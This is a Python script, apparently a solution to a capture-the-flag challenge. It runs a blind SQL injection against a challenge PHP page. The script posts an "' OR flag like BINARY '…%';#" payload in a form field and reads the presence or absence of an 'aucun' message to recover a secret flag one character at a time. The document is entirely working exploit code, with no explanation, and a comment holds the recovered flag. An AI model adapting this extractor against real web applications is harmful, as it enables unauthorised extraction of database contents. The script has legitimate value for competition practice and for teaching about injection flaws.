#!/usr/bin/env nix-shell
#!nix-shell -i python3 -p python3 python3Packages.requests

import requests
from itertools import chain
from time import sleep


URL = "http://challenges.unitedctf.ca:18000/challenge3.php"
FLAG = 'FLAG-In'
# FLAG = 'FLAG-In_the_Land_of_Mariadb_where_the_Columns_lie__Z_H_ymWBX'

char_range = lambda x,y : range(ord(x), ord(y) + 1)

# CHARS = list(chain(char_range('A', 'Z'), char_range('0', '9'), char_range('a', 'z')))

CHARS = list(range(32, 126))
CHARS.remove(ord('_'))
CHARS.remove(ord('%'))
CHARS.append(ord('_'))

while True:
    for ch in CHARS:
        req = f"' OR flag like BINARY '{FLAG+chr(ch)}%';#"
        print("Trying", req)
        r = requests.post(URL, data = {'flagID': req})
        if 'aucun' not in r.text:
            FLAG += chr(ch)
            print('One more result:', FLAG)
            sleep(0.05) # Sleep for 10ms
            break
        sleep(0.01) # Sleep for 10ms
    else:
        # We reached the end of the range
        print('Done!!!!!', FLAG)
        break

